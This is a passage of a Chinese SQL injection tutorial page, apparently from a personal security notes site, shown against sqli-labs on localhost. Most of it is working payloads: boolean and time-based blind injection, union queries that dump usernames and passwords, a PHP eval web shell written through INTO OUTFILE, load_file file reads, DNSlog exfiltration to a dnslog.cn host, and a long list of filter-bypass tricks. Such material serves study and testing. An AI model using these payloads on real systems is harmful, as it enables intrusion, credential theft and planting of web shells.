+<p>我们考虑的点应该是怎么找到布尔盲注的<code>0</code>和<code>1</code></p>
+<p>这时候用到<code>rand()</code>函数了，配套<code>order by</code>使用效果如下</p>
+<div class="highlight"><pre><span></span><code><span class="x">$sql=&quot;SELECT * FROM users ORDER BY $id&quot;;</span>
+<span class="x">order by rand(false)</span>
+<span class="x">order by rand(true)</span>
+</code></pre></div>
+<p>两种排序后的结果不同，也就能判断出sql语句的布尔值了</p>
+<div class="highlight"><pre><span></span><code><span class="x">?sort=rand(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=0)  //返回错误的那种排序结果</span>
+<span class="x">?sort=rand(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105)  //返回正确的那种排序结果</span>
+</code></pre></div>
+<h4 id="_17">时间盲注<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
+<p>不回显报错信息的话，针对字符型sql语句只能使用**order by rand()时间盲注：**</p>
+<div class="highlight"><pre><span></span><code><span class="x">?sort=1&#39; and if(1=1,sleep(0.05),null) and &#39;0</span>
+<span class="x">SELECT * FROM users ORDER by &#39;1&#39; and if(1=1,sleep(0.1),null) and &#39;0&#39;</span>
+</code></pre></div>
+<p>当<code>order by</code>后面的值是正确的时候才会执行后面的<code>if</code>语句</p>
+<p><code>order by</code>的遍历机制是**遍历所有行**，所以每有一行，sleep()就会执行一次，所以这个sleep()的值不要太大</p>
+<div class="highlight"><pre><span></span><code><span class="x">1&#39; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105,sleep(0.1),null) and &#39;1</span>
+</code></pre></div>
+<h3 id="_18">约束攻击<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<p>insert语句会根据varchar(n)来限制字符串最大长度</p>
+<p>如果我们注册<code>admin                1</code>的用户，sql回先执行select看有没有<code>admin                1</code>这个用户</p>
+<p>发现没有，然后插入数据，发生了截断，只能插入前5位，对应字段就多了一个值为<code>admin</code>的行，然后任意登录</p>
+<h2 id="_19">利用方法<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
+<h3 id="information_schema">information_schema套路<a class="headerlink" href="#information_schema" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1    </span>
+<span class="x">对应的查询语句</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39; LIMIT 0,1</span>
+<span class="x">//返回正确页面</span>
+<span class="x">http://localhost/sqli/Less-1/?id=1&#39; and &#39;1&#39;=&#39;2    </span>
+<span class="x">对应的查询语句</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</span>
+<span class="x">//返回空值</span>
+</code></pre></div>
+<p><strong>然后判断字段数量</strong></p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-1/?id=1&#39; order by 3 -- -   //页面正常显示</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; ORDER BY 3 -- -&#39; LIMIT 0,1</span>
+<span class="x">http://localhost/sqli/Less-1/?id=1&#39; order by 4 -- -   //报错1054 - Unknown column &#39;4&#39; in &#39;order clause&#39;</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; ORDER BY 4 -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p>以此可推断字段数为3个</p>
+<p>然后**查看页面显示的字段有哪些**</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-1/?id=1&#39; union select 1,2,3 -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;0&#39; union select 1,2,3 -- -&#39; LIMIT 0,1</span>
+<span class="x">//这时候id要么给错误值、要么为空，不然因为是联合查询还是会输出账号密码</span>
+</code></pre></div>
+<p>可以看到页面显示出为字段**2,3**</p>
+<p><strong>显示数据库名和登录用户</strong></p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-1/?id=0&#39; union select 1,DATABASE(),USER() -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;0&#39; union select 1,DATABASE(),USER() -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p><strong>查看数据库的所有表</strong></p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-1/?id=0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; ),3 -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; ),3 -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p><strong>查询表下的所有字段</strong></p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-1/?id=0&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name=&#39;users&#39; ),3 -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;0&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name=&#39;users&#39; ),3 -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p><strong>查询所有用户名用户名密码</strong></p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-1/?id=0&#39; union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;0&#39; union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p><strong>concat_ws()</strong> 函数是一个拼接字符串函数，间隔符使用**0x7e**，代表的是 <strong>~</strong> 符号</p>
+<h3 id="into-oufileshell">into oufile写shell<a class="headerlink" href="#into-oufileshell" title="Permanent link">&para;</a></h3>
+<p>尝试执行into outfile发现报错</p>
+<div class="highlight"><pre><span></span><code><span class="x">show variables like &#39;%secure%&#39;;</span>
+</code></pre></div>
+<p>其中有个secure-file-priv参数：</p>
+<ul>
+<li>secure_file_priv的值为null ，表示限制mysqld不允许导入|导出</li>
+<li>secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下</li>
+<li>secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制</li>
+</ul>
+<p>我们需要手动修改my.ini文件中secure-file-priv的值为空<code>secure_file_priv=</code>，重启mysql</p>
+<p>写入一句话：</p>
+<div class="highlight"><pre><span></span><code><span class="x">&#39;)) union select &quot;</span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">&quot; into outfile &#39;路径&#39;</span>
+<span class="x">http://127.0.0.1/sqlilabs2/Less-7/index.php?id=-1&#39;)) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile &quot;E:\softs\phpstudy_pro\WWW\sqlilabs2\Less-7\mm2.php&quot;--+</span>
+</code></pre></div>
+<p>写入需要注意的：</p>
+<ul>
+<li>写入的内容需要用hex转码，以防拦截</li>
+<li>写入的前提需要知道物理文件路径</li>
+<li>写入的前提是有权限写入，或者有配置写入的权限</li>
+</ul>
+<h3 id="load_file">load_file读文件<a class="headerlink" href="#load_file" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">?id=1&#39;and 1=2 union select 1,load_file(&#39;D:\\wamp\\www\\111.php&#39;)%23</span>
+<span class="x">?id=1&#39;and 1=2 union select 1,load_file(0x443A2F77616D702F7777772F312E706870)%23</span>
+</code></pre></div>
+<h3 id="mysql-dnslog">MySQL DNSlog盲打<a class="headerlink" href="#mysql-dnslog" title="Permanent link">&para;</a></h3>
+<p>前提条件依旧是mysql.ini中secure_file_priv必须为空</p>
+<div class="highlight"><pre><span></span><code><span class="x">&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4s1b2n.dnslog.cn&#39;))),1,0)--+</span>
+</code></pre></div>
+<p>攻击者 --发送payload–&gt;web服务器----&gt;数据库(解析load file函数)----&gt;根据语句包含的域名访问本地dns服务器–不能解析发送到–&gt;公网上dns服务器解析–解析完成后–&gt;dns本地服务器----&gt;攻击者服务器</p>
+<p>因为在数据库中已经把要执行的命令带入到dns解析中去了，dns服务器再发送给攻击者服务器，就可以搜到前缀，前缀就是我们想得到的信息。</p>
+<h2 id="_20">过滤绕过<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h2>
+<h3 id="_21">过滤了空格<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>**注释符**绕过：</p>
+</blockquote>
+<p>如果只过滤了空格，没有过滤<code>/*</code>，那么我们可以利用<code>/**/</code>来绕过空格过滤，Sqlmap使用命令:  <code>--tamper=space2comment.py</code></p>
+<blockquote>
+<p>**内联注释**绕过：</p>
+</blockquote>
+<p>当MySQL数据库版本大于等于5.55.55时，可以使用内联注释<code>/!**/</code>，如：<code>/*!union*/</code>、 <code>/*!select*/</code>或<code>/*!50000union*/</code>等</p>
+<p>Sqlmap中关于内联注释的脚本：versionedmorekeywords.py 和 halfversionedmorekeywords.py</p>
+<blockquote>
+<p>**双空格**绕过：</p>
+<p>用**括号**绕过：</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">&#39;and(updatexml(1,concat(0x7e,database()),1))and&#39;1&#39;=&#39;1</span>
+</code></pre></div>
+<blockquote>
+<p>用**回车**绕过：ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a</p>
+<p>用**换行符**绕过：url编码为%0a</p>
+</blockquote>
+<h3 id="sql_2">区分大小写过滤了SQL关键词<a class="headerlink" href="#sql_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">function blacklist($id)</span>
+<span class="x">{   </span>
+<span class="x">    $id = preg_replace(&#39;/[\s]/&#39;,&quot;&quot;,$id);            //过滤  空格 %20 </span>
+<span class="x">    $id = preg_replace(&#39;/or/&#39;,&quot;&quot;,$id);              //过滤  or  </span>
+<span class="x">    $id = preg_replace(&#39;/and/&#39;,&quot;&quot;,$id);             //过滤  and </span>
+<span class="x">    $id = preg_replace(&#39;/union/&#39;,&quot;&quot;,$id);           //过滤  union</span>
+<span class="x">    $id = preg_replace(&#39;/by/&#39;,&quot;&quot;,$id);              //过滤  by </span>
+<span class="x">    $id = preg_replace(&#39;/select/&#39;,&quot;&quot;,$id);          //过滤  select  </span>
+<span class="x">    $id = preg_replace(&#39;/from/&#39;,&quot;&quot;,$id);            //过滤  from</span>
+<span class="x">    $id = preg_replace(&#39;/floor/&#39;,&quot;&quot;,$id);           //过滤  floor</span>
+<span class="x">    $id = preg_replace(&#39;/concat/&#39;,&quot;&quot;,$id);          //过滤  concat</span>
+<span class="x">    $id = preg_replace(&#39;/count/&#39;,&quot;&quot;,$id);           //过滤  count</span>
+<span class="x">    $id = preg_replace(&#39;/rand/&#39;,&quot;&quot;,$id);            //过滤  rand</span>
+<span class="x">    $id = preg_replace(&#39;/group by/&#39;,&quot;&quot;,$id);        //过滤  group by</span>
+<span class="x">    $id = preg_replace(&#39;/substr/&#39;,&quot;&quot;,$id);          //过滤  substr</span>
+<span class="x">    $id = preg_replace(&#39;/ascii/&#39;,&quot;&quot;,$id);           //过滤  ascii</span>
+<span class="x">    $id = preg_replace(&#39;/mid/&#39;,&quot;&quot;,$id);             //过滤  mid</span>
+<span class="x">    $id = preg_replace(&#39;/like/&#39;,&quot;&quot;,$id);            //过滤  like</span>
+<span class="x">    $id = preg_replace(&#39;/sleep/&#39;,&quot;&quot;,$id);           //过滤  sleep</span>
+<span class="x">    $id = preg_replace(&#39;/when/&#39;,&quot;&quot;,$id);            //过滤  when</span>
+<span class="x">    $id = preg_replace(&#39;/order/&#39;,&quot;&quot;,$id);           //过滤  order  </span>
+<span class="x">    return $id;</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>由于这里过滤并没有区分大小写，所以这里我们可以**大小写绕过**</p>
+<p>sqlmap 中也有专门的随机大小写的绕过脚本 randomcase.py</p>
+<h3 id="sql_3">不区分大小写过滤了SQL关键词<a class="headerlink" href="#sql_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">function blacklist($id)</span>
+<span class="x">{   </span>
+<span class="x">    $id = preg_replace(&#39;/[\s]/&#39;,&quot;&quot;,$id);            //过滤  空格 %20 </span>
+<span class="x">    $id = preg_replace(&#39;/or/i&#39;,&quot;&quot;,$id);             //过滤  or  </span>
+<span class="x">    $id = preg_replace(&#39;/and/i&#39;,&quot;&quot;,$id);            //过滤  and </span>
+<span class="x">    $id = preg_replace(&#39;/union/i&#39;,&quot;&quot;,$id);              //过滤  union</span>
+<span class="x">    $id = preg_replace(&#39;/by/i&#39;,&quot;&quot;,$id);             //过滤  by </span>
+<span class="x">    $id = preg_replace(&#39;/select/i&#39;,&quot;&quot;,$id);          //过滤  select  </span>
+<span class="x">    $id = preg_replace(&#39;/from/i&#39;,&quot;&quot;,$id);           //过滤  from</span>
+<span class="x">    $id = preg_replace(&#39;/floor/i&#39;,&quot;&quot;,$id);              //过滤  floor</span>
+<span class="x">    $id = preg_replace(&#39;/count/i&#39;,&quot;&quot;,$id);           //过滤  count</span>
+<span class="x">    $id = preg_replace(&#39;/rand/i&#39;,&quot;&quot;,$id);            //过滤  rand</span>
+<span class="x">    $id = preg_replace(&#39;/group by/i&#39;,&quot;&quot;,$id);        //过滤  group by</span>
+<span class="x">    $id = preg_replace(&#39;/substr/i&#39;,&quot;&quot;,$id);          //过滤  substr</span>
+<span class="x">    $id = preg_replace(&#39;/ascii/i&#39;,&quot;&quot;,$id);           //过滤  ascii</span>
+<span class="x">    $id = preg_replace(&#39;/mid/i&#39;,&quot;&quot;,$id);             //过滤  mid</span>
+<span class="x">    $id = preg_replace(&#39;/like/i&#39;,&quot;&quot;,$id);            //过滤  like</span>
+<span class="x">    $id = preg_replace(&#39;/sleep/i&#39;,&quot;&quot;,$id);           //过滤  sleep</span>
+<span class="x">    $id = preg_replace(&#39;/when/i&#39;,&quot;&quot;,$id);            //过滤  when</span>
+<span class="x">    $id = preg_replace(&#39;/order/i&#39;,&quot;&quot;,$id);           //过滤  order  </span>
+<span class="x">    return $id;</span>
+<span class="x">}</span>
+</code></pre></div>
+<blockquote>
+<p>第一尝试**双写绕过**</p>
+</blockquote>
+<p>sqlmap 中双拼绕过的脚本 nonrecursivereplacement.py</p>
+<blockquote>
+<p>第二看是否有关键词漏过滤了（<strong>过滤缺失</strong>）</p>
+</blockquote>
+<p>使用SQL关键词来进行fuzz，看看哪些关键词没有被过滤（后续补充）</p>
+<div class="highlight"><pre><span></span><code><span class="x">where</span>
+<span class="x">select</span>
+<span class="x">from</span>
+<span class="x">floor</span>
+<span class="x">concat</span>
+<span class="x">count</span>
+<span class="x">rand</span>
+<span class="x">group by</span>
+<span class="x">extractvalue</span>
+<span class="x">limit</span>
+<span class="x">updatexml</span>
+<span class="x">join</span>
+<span class="x">exp</span>
+<span class="x">left</span>
+<span class="x">right</span>
+<span class="x">substr</span>
+<span class="x">ascii</span>
+<span class="x">mid</span>
+<span class="x">ord</span>
+<span class="x">regexp</span>
+<span class="x">rlike</span>
+<span class="x">like</span>
+<span class="x">sleep</span>
+<span class="x">if</span>
+<span class="x">length</span>
+<span class="x">benchmark</span>
+<span class="x">information_schema</span>
+<span class="x">get_lock</span>
+<span class="x">rpad</span>
+<span class="x">load_file</span>
+<span class="x">case</span>
+</code></pre></div>
+<blockquote>
+<p>第三就是使用**等价函数替换**</p>
+</blockquote>
+<p>substr 、substring 、mid 都过滤了的话，可以考虑使用 left()</p>
+<p>sleep 可以用 benchmark() 替换</p>
+<p>group_concat 可以使用 concat_ws()替换</p>
+<blockquote>
+<p>用<code>/**/</code>，<code>&lt;&gt;</code>来**分割关键字**</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">sel&lt;&gt;ect</span>
+<span class="x">sel/**/ect</span>
+</code></pre></div>
+<h3 id="_22">过滤了引号<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>**16进制编码**绕过：</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">select * from test where username=&#39;admin&#39;; </span>
+<span class="x">select * from test where username=&quot;admin&quot;;</span>
+</code></pre></div>
+<p>当引号被过滤了的话， 'admin' 或者 "admin" 就没法用了，我们可以用 admin 的16进制 0x61646d696e 代替</p>
+<div class="highlight"><pre><span></span><code><span class="x">select*from users where username=0x61646d696e;</span>
+</code></pre></div>
+<p>注：中文无法使用16进制编码绕过</p>
+<blockquote>
+<p>**ASCII编码**绕过：</p>
+</blockquote>
+<p>admin的各个字符的ascii值为：97-100-109-105-110 。所以我们可以使用concat(char(97),char(100),char(109),char(105),char(110)) 来代替admin</p>
+<blockquote>
+<p>**URL编码**绕过(有条件)：</p>
+</blockquote>
+<p>前提就是，后端在处理接收的参数时对该参数进行了URL解码，并且该URL解码是在过滤函数之后才可以。</p>
+<div class="highlight"><pre><span></span><code><span class="x">$username=$_GET[&#39;username&#39;];</span>
+<span class="x">$username=blacklist($username);   #过滤函数</span>
+<span class="x">$username=urldecode($username);   #URL解码</span>
+</code></pre></div>
+<p>于是我们可以使用 " 的 URL编码 的 URL编码 ，也就是 %2522</p>
+<p>在Sqlmap中，对payload进行URL编码的脚本是：charencode.py(URL编码) 、chardoubleencode.py(两次URL编码)</p>
+<h3 id="_23">过滤了逗号<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>简单注入可以使用**join方法**绕过</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">union select 1,2,3</span>
+<span class="x">union select * from (select 1)a join (select 2)b join (select 3)</span>
+</code></pre></div>
+<blockquote>
+<p>对于substr、substring() 和 mid() 这两个函数可以使用**from for**的方式来绕过</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">// substr() 逗号绕过</span>
+<span class="x">select * from test where id=1 and (select ascii(substr(username,2,1)) from admin limit 1)&gt;97;</span>
+<span class="x">select * from test where id=1 and (select ascii(substr(username from 2 for 1))from admin limit 1)&gt;97;</span>
+
+<span class="x">// substring() 逗号绕过</span>
+<span class="x">select * from test where id=1 and (select ascii(substring(username,2,1)) from admin limit 1)&gt;97;</span>
+<span class="x">select * from test where id=1 and (select ascii(substring(username from 2 for 1))from admin limit 1)&gt;97;</span>
+
+<span class="x">// mid() 逗号绕过</span>
+<span class="x">select * from test where id=1 and (select ascii(mid(username,2,1)) from admin limit 1)&gt;97;</span>
+<span class="x">select * from test where id=1 and (select ascii(mid(username from 2 for 1))from admin limit 1)&gt;97;</span>
+</code></pre></div>
+<blockquote>
+<p>对于limit ，可以用 <strong>offset</strong> 绕过</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">// limit 逗号绕过</span>
+<span class="x">select * from test where id=1 limit 1,2; </span>
+<span class="x">select * from test where id=1 limit 2 offset 1;</span>
+</code></pre></div>
+<h3 id="_24">过滤了比较符&lt; &gt;<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>使用到 **greatest()和least()**来进行绕过。greatest()返回最大值，least()返回最小值</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">select * from users where id=1 and ascii(substring(database(),0,1))&gt;64;</span>
+<span class="x">select * from users where id=1 and greatest(ascii(substring(database(),0,1)),64)&gt;64;</span>
+
+<span class="x">select * from users where id=1 and ascii(substring(database(),0,1))&lt;64;</span>
+<span class="x">select * from users where id=1 and least(ascii(substring(database(),0,1)),64)&lt;64;</span>
+</code></pre></div>
+<p>在Sqlmap中，用greatest代替大于号的脚本是：greatest.py</p>
+<blockquote>
+<p>使用**strcmp(str1,str2)**绕过：当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1</p>
+<p>使用**in操作符**绕过：</p>
+<p>使用**between  and**来绕过：选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期</p>
+</blockquote>
+<h3 id="or-and-xor-not">过滤了 or and xor not<a class="headerlink" href="#or-and-xor-not" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>and用 <strong>&amp;&amp;</strong> 代替 </p>
+<p>or用 <strong>||</strong> 代替</p>
+<p>xor用 <strong>|</strong> 代替 </p>
+<p>not用 <strong>!</strong> 代替 </p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="x">select * from users where id=1 and 1=2;</span>
+<span class="x">select * from users where id=1 &amp;&amp; 1=2；</span>
+
+<span class="x">select * from users where id=1 or 1=2;</span>
+<span class="x">select * from users where id=1 || 1=2;</span>
+</code></pre></div>
+<h3 id="_25">过滤了注释符<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
+<p>如果过滤了#，则可以利用 <strong>||'</strong> 来绕过。但是这个只限于闭合后面是单引号这种情形</p>
+<div class="highlight"><pre><span></span><code><span class="x">select * from users where id=&#39;1&#39; and 1=1#&#39; limit 0,1</span>
+<span class="x">select * from users where id=&#39;1&#39; and 1=1||&#39;&#39; limit 0,1</span>
+</code></pre></div>
+<p>如果是数字型注入，这种方法就不奏效</p>
+<p>或者是**放弃注释后面内容**，手动拼接</p>
+<div class="highlight"><pre><span></span><code><span class="x">-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1&#39; LIMIT 0,1</span>
+</code></pre></div>
+<h3 id="_26">过滤了=<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
+<p>使用 <strong>like、rlike、regexp</strong> </p>
+<ul>
+<li>like：就是等于的意思</li>
+<li>rlike：就是**里面包含**有这个</li>
+<li>regexp：和rlike一样，**里面包含**有即可</li>
+</ul>
+<p>在Sqlmap中，用like代替=号的脚本是：equaltolike.py</p>
+<h3 id="http">HTTP参数污染绕过<a class="headerlink" href="#http" title="Permanent link">&para;</a></h3>
+<p>代码只验证了第一个参数id的合法性</p>
+<p>但是<code>$_GET</code>是从后往前取值的，<code>$_GET['id']</code>是取GET传递的**最后一个**名称为id的值</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-29/login.php?id=1&amp;id=-1&#39; union select 1,2,3 -- -</span>
+</code></pre></div>
+<p>第二个id参数通过<code>$_GET</code>传递造成sql注入</p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="页脚" >
+      
+        
+        <a href="../sqlmap%E4%BD%BF%E7%94%A8/" class="md-footer__link md-footer__link--prev" aria-label="上一页: sqlmap使用" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              sqlmap使用
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../XXE/XXE%E6%BC%8F%E6%B4%9E/" class="md-footer__link md-footer__link--next" aria-label="下一页: XXE漏洞" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              XXE漏洞
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2019 - 2022 F1rstb100d
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d6c3db9e.min.js"></script>
+      
+    
+  </body>
+</html>
